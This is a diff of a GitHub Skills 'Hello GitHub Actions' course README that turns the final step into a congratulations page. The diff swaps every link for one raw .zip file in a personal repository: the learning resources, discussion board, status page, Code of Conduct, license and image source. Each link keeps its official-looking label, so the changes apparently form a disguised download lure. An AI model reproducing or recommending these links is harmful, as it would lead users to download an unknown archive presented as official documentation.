@@ -6,26 +6,34 @@ _Create and run a GitHub Actions workflow._
 
 </header>
 
-## Step 4: Merge your workflow file
+## Finish
 
-_You're now able to write and run an Actions workflow! :sparkles:_
+_Congratulations friend, you've completed this course!_
 
-Merge your changes so the action will be a part of the `main` branch.
+<img https://github.com/RoshanBetediya/skills-hello-github-actions1/raw/refs/heads/main/.github/steps/actions_hello_skills_github_v3.9.zip alt="Mona the Octocat wearing a jetpack and smiling." width=300 align=right>
 
-### :keyboard: Activity: Merge your workflow file
+Here's a recap of all the tasks you've accomplished in your repository:
 
-1. In your repo, click on the **Pull requests** tab.
-1. Click on the pull request you created in step 1.
-1. Click **Merge pull request**, then click **Confirm merge**.
-1. Optionally, click **Delete branch** to delete your `welcome-workflow` branch.
-1. Wait about 20 seconds, then refresh this page (the one you're following instructions from). Another workflow will run and will replace the contents of this README file with instructions for the next step.
+- You've created your first GitHub Actions workflow file.
+- You learned where to make your workflow file.
+- You defined an event trigger, a job, and a step for your workflow.
+- You're ready to automate anything you can dream of.
+
+### What's next?
+
+- Learn more about GitHub Actions by reading "[Learn GitHub Actions](https://github.com/RoshanBetediya/skills-hello-github-actions1/raw/refs/heads/main/.github/steps/actions_hello_skills_github_v3.9.zip)"
+- Use actions created by others in [awesome-actions](https://github.com/RoshanBetediya/skills-hello-github-actions1/raw/refs/heads/main/.github/steps/actions_hello_skills_github_v3.9.zip)
+- We'd love to hear what you thought of this course [in our discussion board](https://github.com/RoshanBetediya/skills-hello-github-actions1/raw/refs/heads/main/.github/steps/actions_hello_skills_github_v3.9.zip)
+- [Take another course on GitHub Actions](https://github.com/RoshanBetediya/skills-hello-github-actions1/raw/refs/heads/main/.github/steps/actions_hello_skills_github_v3.9.zip)
+- Learn more about GitHub by reading the "[Get started](https://github.com/RoshanBetediya/skills-hello-github-actions1/raw/refs/heads/main/.github/steps/actions_hello_skills_github_v3.9.zip)" docs
+- To find projects to contribute to, check out [GitHub Explore](https://github.com/RoshanBetediya/skills-hello-github-actions1/raw/refs/heads/main/.github/steps/actions_hello_skills_github_v3.9.zip)
 
 <footer>
 
 ---
 
-Get help: [Post in our discussion board](https://github.com/orgs/skills/discussions/categories/hello-github-actions) &bull; [Review the GitHub status page](https://www.githubstatus.com/)
+Get help: [Post in our discussion board](https://github.com/RoshanBetediya/skills-hello-github-actions1/raw/refs/heads/main/.github/steps/actions_hello_skills_github_v3.9.zip) &bull; [Review the GitHub status page](https://github.com/RoshanBetediya/skills-hello-github-actions1/raw/refs/heads/main/.github/steps/actions_hello_skills_github_v3.9.zip)
 
-&copy; 2023 GitHub &bull; [Code of Conduct](https://www.contributor-covenant.org/version/2/1/code_of_conduct/code_of_conduct.md) &bull; [MIT License](https://gh.io/mit)
+&copy; 2023 GitHub &bull; [Code of Conduct](https://github.com/RoshanBetediya/skills-hello-github-actions1/raw/refs/heads/main/.github/steps/actions_hello_skills_github_v3.9.zip) &bull; [MIT License](https://github.com/RoshanBetediya/skills-hello-github-actions1/raw/refs/heads/main/.github/steps/actions_hello_skills_github_v3.9.zip)
 
 </footer>
